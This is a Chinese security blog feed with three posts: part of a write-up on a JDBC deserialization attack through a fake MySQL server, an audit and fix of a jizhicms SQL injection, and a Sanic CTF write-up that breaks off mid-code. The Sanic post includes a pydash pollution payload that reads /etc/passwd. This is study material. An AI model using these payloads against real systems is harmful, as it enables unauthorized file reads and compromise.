java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rs = stmt.executeQuery(<span class="string">&quot;SHOW SESSION STATUS&quot;</span>);            ResultSetUtil.resultSetToMap(toPopulate, rs);</span><br></pre></td></tr></table></figure><p>resultSetToMap中调用了readObject</p><p><code>ServerStatusDiffInterceptor</code>是一个拦截器，在JDBC URL中设定属性queryInterceptors为<code>ServerStatusDiffInterceptor</code>时，执行查询语句会调用拦截器的preProcess和postProcess方法, 而<code>preProcess</code>和<code>postProcess</code>又调用了<code>populateMapWithSessionStatusValues</code>, 进而最终触发readObject</p><p>有点乱, 上图:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820140216574.png" alt="image-20240820140216574"></p><p>问题就出在数据库查询<code>SHOW SESSION STATUS</code>返回的rs未经过验证进行反序列化, 造成了一个服务端打客户端的反序列化漏洞</p><p>因此, 下一步是伪造一个mysql数据库返回恶意数据</p><h3 id="伪造mysql服务器"><a href="#伪造mysql服务器" class="headerlink" title="伪造mysql服务器"></a>伪造mysql服务器</h3><p>wireshark抓本地回环的包, 过滤出mysql的数据包</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820140601889.png" alt="image-20240820140601889"></p><p>简单理解一下原理</p><p>以下内容来自 <a href="https://xz.aliyun.com/t/8159">https://xz.aliyun.com/t/8159</a></p><p>No.1699是一个问候报文, </p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820142021243.png" alt="image-20240820142021243"></p><p>直接发送即可</p><p>之后客户端尝试连接数据库, 服务端返回Respone OK, 即 No.1716</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820142206566.png" alt="image-20240820142206566"></p><p>也是直接发送即可</p><p>之后是编写 <code>show session status</code>的响应包</p><blockquote><p><code>show session status</code>属于<strong>request Query</strong> 报文。对于查询数据包的响应包可以分为四种：错误包（ERR Packet）、正确包（OK Packet）、 Protocol::LOCAL_INFILE_Request、结果集（ProtocolText::Resultset）。我们上面看到的<strong>Response OK</strong>数据包就是<strong>OK packet</strong>。</p></blockquote><p>一个结果集响应包的结构。</p><ul><li>数据段1：说明下面的结果集有多少列</li><li>数据段2：列的定义</li><li>数据段3： EOF 包</li><li>数据段4：行数据。</li></ul><h4 id="数据段1"><a href="#数据段1" class="headerlink" title="数据段1"></a>数据段1</h4><p><code>01 00 00 01 02</code> 前三字节表示数据长度为1，sequence id为1，最后一字节02表示有两列</p><h4 id="数据段2"><a href="#数据段2" class="headerlink" title="数据段2"></a>数据段2</h4><p><code>1a000002036465660001630163016301630c3f00ffff0000fcffff000000</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1a 00 00  //3字节表示长度（这个长度说的是协议的内容长度，不包括序号那一字节）</span><br><span class="line">02      //序号 因为是第二个数据字段</span><br><span class="line">03646566  // 这个就是def的意思。</span><br><span class="line">00   //schema 协议因为不使用就用00</span><br><span class="line">01 63  //table 因为我们使用列数据，就不需要名字了，下面几个都是任意字符。字符串第一字节是用来说明长度的。</span><br><span class="line">01 63  //org_table  01表示1字节，63是数据</span><br><span class="line">0163    //name  </span><br><span class="line">0163   //org_name</span><br><span class="line">0c      filler  // length of the following fields 总是0x0c</span><br><span class="line">3f00   //characterset  字符编码 003f是binary </span><br><span class="line">ffff0000  column_length //允许数据最大长度，就是我们行数据的最大长度。ffff</span><br><span class="line">fc    //column_type 这一列数据类型  fc表示blob  </span><br><span class="line">9000    //flags  9000用的官方的 poc可以运行。  看fnmsd的要大于128好像。</span><br><span class="line">00          //decimals</span><br><span class="line">0000        //filler_2</span><br></pre></td></tr></table></figure><h4 id="数据段3"><a href="#数据段3" class="headerlink" title="数据段3"></a>数据段3</h4><p>EOF包</p><h4 id="数据段4"><a href="#数据段4" class="headerlink" title="数据段4"></a>数据段4</h4><p>数据字段4就是POC了。POC其实和上面一样的。计算出长度（3字节）序号（1字节）行数据（行数据第一个字节是数据的长度）</p><p>最终poc直接拿大佬的来用了</p><p><a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p><p>改一下配置文件直接使用</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820150150852.png" alt="image-20240820150150852"></p><p>值得注意的是这里居然还有任意文件读取,</p><p>加上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;allowLoadLocalInfile=true&amp;allowUrlInLocalInfile=true&amp;maxAllowedPacket=655360</span><br></pre></td></tr></table></figure><p>即可</p><p>这部分内容直接参考</p><p><a href="https://m0d9.me/2021/04/20/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5/">https://m0d9.me/2021/04/20/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5/</a></p><p><a href="https://xz.aliyun.com/t/12011">https://xz.aliyun.com/t/12011</a></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/8159">https://xz.aliyun.com/t/8159</a></p><p><a href="https://www.anquanke.com/post/id/203086">https://www.anquanke.com/post/id/203086</a></p><p><a href="https://m0d9.me/2021/04/20/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5/">https://m0d9.me/2021/04/20/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5/</a></p><p><a href="https://xz.aliyun.com/t/12011">https://xz.aliyun.com/t/12011</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> JDBC反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计之CMS漏洞初探</title>
      <link href="/2024/08/01/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BCMS%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2/"/>
      <url>/2024/08/01/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BCMS%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP代码审计之CMS漏洞初探"><a href="#PHP代码审计之CMS漏洞初探" class="headerlink" title="PHP代码审计之CMS漏洞初探"></a>PHP代码审计之CMS漏洞初探</h1><p>Java代码实在难懂, 索性先暂时放一放, 最近心血来潮想提升一下php代码审计的能力, (真的很想体验一下真实的挖漏洞)</p><p>话不多说我们随便找几个cms已经公布的漏洞来练练手</p><h2 id="jizhicms-v2-3-3-sql注入"><a href="#jizhicms-v2-3-3-sql注入" class="headerlink" title="jizhicms v2.3.3 sql注入"></a>jizhicms v2.3.3 sql注入</h2><p>这个2.3.3版本下载不到但是能下到2.3.2</p><p><a href="https://gitee.com/Cherry_toto/jizhicms/repository/archive/2.3.2">https://gitee.com/Cherry_toto/jizhicms/repository/archive/2.3.2</a></p><p>搭建好环境开干</p><p>我测试了一下也是存在这个漏洞的</p><p>首先漏洞的点在这个位置</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php/admins/Member/memberedit.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>jizhicms</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>234</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://jizhicms</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://jizhicms/index.php/admins/Member/memberedit/id/2.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=apkas20el5jn5o9070b1gj3176</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">go</span>=<span class="number">1</span>&amp;id=<span class="number">1</span>&amp;username=aaa&amp;openid=rtr&amp;sex=<span class="number">0</span>&amp;gid=<span class="number">0</span>&amp;litpic=&amp;file=&amp;tel=&amp;jifen=<span class="number">0</span>.<span class="number">00</span>&amp;money=<span class="number">0</span>.<span class="number">00</span>&amp;email=&amp;province=&amp;city=&amp;address=&amp;regtime=<span class="number">2024</span>-<span class="number">08</span>-<span class="number">01</span>+<span class="number">22</span>%<span class="number">3</span>A33%<span class="number">3</span>A07&amp;logintime=<span class="number">2024</span>-<span class="number">08</span>-<span class="number">01</span>+<span class="number">22</span>%<span class="number">3</span>A33%<span class="number">3</span>A07&amp;signature=&amp;birthday=&amp;pid=<span class="number">0</span>&amp;isshow=<span class="number">1</span>&amp;pass=&amp;repass=</span></span><br></pre></td></tr></table></figure><p>id参数存在注入</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240801234103555.png" alt="image-20240801234103555"></p><p>那么就去代码中看看</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802003811944.png" alt="image-20240802003811944"></p><p>不难定位到这个逻辑实现的位置</p><p>从源码来看这个cms是一个MVC架构,</p><p>我们主要去看update方法</p><p>调试一下很容易就能定位到</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802004056234.png" alt="image-20240802004056234"></p><p>这段代码是没有过滤的, 有可能存在过滤的位置也就是<code>__prepera_format</code>和<code>runSql</code>这两个方法</p><p>我们先去调试<code>__prepera_format</code>这个方法</p><p>不难看出这里是有问题的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802122153511.png" alt="image-20240802122153511"></p><p>这里的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$value</span>-&gt;Type,<span class="string">&#x27;int&#x27;</span>)!==<span class="literal">false</span> || <span class="title function_ invoke__">stripos</span>(<span class="variable">$value</span>-&gt;Type,<span class="string">&#x27;decimal&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="literal">false</span>)&#123;</span><br><span class="line"><span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="variable">$rows</span>[<span class="variable">$field</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本意应该是通过<code>jz_member</code>的结构来格式化我们查询的内容, 而在<code>jz_member</code>表中<code>id</code>字段应该是<code>int(11)</code>这里虽然正确判断出了id字段为int型, 但是在处理数据时并没有把我们传入的id强转为数字型而是直接进行了赋值</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802122628190.png" alt="image-20240802122628190"></p><p>可以看见id字段仍然是字符串</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802123335763.png" alt="image-20240802123335763"></p><p>同样的问题, <code>$condition</code>也就是传入的id字段的内容,直接被拼接到了where语句后</p><p>我们去跟进<code>runSql</code>也是看不见任何的过滤</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802123538306.png" alt="image-20240802123538306"></p><p>由此造成了sql注入</p><p>那么我们简单修复一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__prepera_format</span>(<span class="params"><span class="variable">$rows</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$table</span> = <span class="built_in">self</span>::<span class="variable">$table</span>;</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">getTable</span>(<span class="variable">$table</span>);  </span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();  </span><br><span class="line"><span class="variable">$columns</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>(PDO::<span class="variable constant_">FETCH_CLASS</span>);</span><br><span class="line"><span class="variable">$newcol</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$columns</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$field</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$value</span>-&gt;Field);</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$value</span>-&gt;Type,<span class="string">&#x27;int&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="literal">false</span>)&#123;</span><br><span class="line"><span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="title function_ invoke__">intval</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">elseif</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$value</span>-&gt;Type,<span class="string">&#x27;decimal&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="literal">false</span>)&#123;</span><br><span class="line">                        <span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="title function_ invoke__">floatval</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="number">0.0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="literal">false</span> )&#123;</span><br><span class="line"><span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="variable">$rows</span>[<span class="variable">$field</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$newcol</span>;</span><br><span class="line"><span class="comment">//return array_intersect_key($rows,$newcol);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802125221708.png" alt="image-20240802125221708"></p><p>可以看见此时sqlmap已经跑不出来了</p><p>实际上在2.3.2版本是有全局字符串过滤的, 但是并没有包含对id的过滤</p><p>官方的修复手法简单粗暴, 在<code>get_fields_data</code>函数中加上了:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="title function_ invoke__">format_param</span>(<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>这里的format_param函数将id强转为int</p><p><a href="https://www.yijinglab.com/specialized/20230308140107">https://www.yijinglab.com/specialized/20230308140107</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP代码设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从Sanic到Sanic&#39;s revenge</title>
      <link href="/2024/07/27/%E4%BB%8ESanic%E5%88%B0Sanic-s-revenge/"/>
      <url>/2024/07/27/%E4%BB%8ESanic%E5%88%B0Sanic-s-revenge/</url>
      
        <content type="html"><![CDATA[<h1 id="从Sanic到Sanic’s-revenge"><a href="#从Sanic到Sanic’s-revenge" class="headerlink" title="从Sanic到Sanic’s revenge"></a>从Sanic到Sanic’s revenge</h1><h2 id="Sanic"><a href="#Sanic" class="headerlink" title="Sanic"></a>Sanic</h2><p>首先是国赛中的一道名为Sanic的题目</p><p>参考gxn师傅的题解</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></p><p>首先访问&#x2F;src拿到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>在<code>/admin</code>处存在污染(pydash&#x3D;&#x3D;5.1.2), 不过我们需要</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>所以要先完成<code>/login</code>里的登录操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br></pre></td></tr></table></figure><p>但在cookie中<code>;</code>是分割符号</p><p>sanic在处理 Cookie时, 对八进制是有转换的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728171506324.png" alt="image-20240728171506324"></p><p>因此这里可以使用八进制绕过</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240727175702072.png" alt="image-20240727175702072"></p><p>接下来就是污染<code>__file__</code>这个全局变量, 他在<code>/src</code>路由下被使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br></pre></td></tr></table></figure><p><code>_.</code>被ban了, 这里需要看一下pydash的源码, 我们跟进<code>_set</code>方法一直到<code>update_with</code>, 这里时真正进行merge的地方</p><p>选中参数path往下翻会发现</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728172719311.png" alt="image-20240728172719311"></p><p><code>to_path_tokens</code>对path进行了解析, 我们跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728172917613.png" alt="image-20240728172917613"></p><p>有一个名为<code>RE_PATH_KEY_DELIM</code>的正则对其进行了过滤</p><p>点进去, 这个正则是这样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RE_PATH_KEY_DELIM = re.<span class="built_in">compile</span>(<span class="string">r&quot;(?&lt;!\\)(?:\\\\)*\.|(\[\d+\])&quot;</span>)</span><br></pre></td></tr></table></figure><p>大概意思是 用偶数个<code>/</code>加上<code>.</code>来分割字符串, 并且匹配<code>[数字]</code></p><p>理论上来说我们加上<code>\\</code>就可以, 但是这里调试了半天, <code>\\</code>并不会被忽略导致第一个key和第二个连在一起了,</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728213148221.png" alt="image-20240728213148221"></p><p> 我们单把这个正则从推导式中拿出来又能正确分割</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728213402968.png" alt="image-20240728213402968"></p><p>感觉这里是推导式的锅, 我们还是老实用大佬的poc:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__init__\\\\.__globals__</span><br></pre></td></tr></table></figure><p>这样我们就可以读取任意文件了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;.__init__\\\\.__globals__\\\\.__file__&quot;,&quot;value&quot;:&quot;/etc/passwd&quot;&#125;</span><br></pre></td></tr></table></figure><p>但是flag的位置不得而知,  正常思路我们需要再找到一个能够遍历目录的点</p><p>大概扫一眼, 也就这个位置和目录有点关系了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span 